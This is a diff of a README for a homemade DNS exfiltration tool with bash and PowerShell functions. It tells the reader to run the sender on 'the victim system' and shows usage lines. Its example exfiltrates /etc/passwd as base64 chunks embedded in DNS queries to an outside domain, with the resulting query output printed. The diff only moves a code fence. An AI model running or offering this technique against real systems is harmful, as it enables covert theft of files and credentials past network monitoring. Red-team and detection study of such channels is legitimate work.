@@ -3,12 +3,13 @@ There are many other DNS exfiltration tools that are much better, but I wrote th
 
 Bash functions are dnssend and dnsrec, and there is a dnssend function for Powershell.  Run dnsrec on your dns server and run dnssend on the victim system.
 
+
+```
 Usage on server: # dnsrec <filetorecieve> <domain>
 Usage on victim: # dnssend <filetosend> <domain> [linenumber]
 The line number is optional.  It retransmits a specific line in case the packet was dropped
 The dnssend Powershell function double-wraps with base64, so you will need to add another "|base64 -d" when you restore the file.
 
-```
 Example on victim:
 ~ # dnssend /etc/passwd exfil.lan
 line 1 / 12   H4sIAGZv81sAA21UTW+jMBC951dw3JUSGQJkU9+6WmkvbQ/t/gEHDFgFO7INJP3.1542680422.1.x.exfil.lan
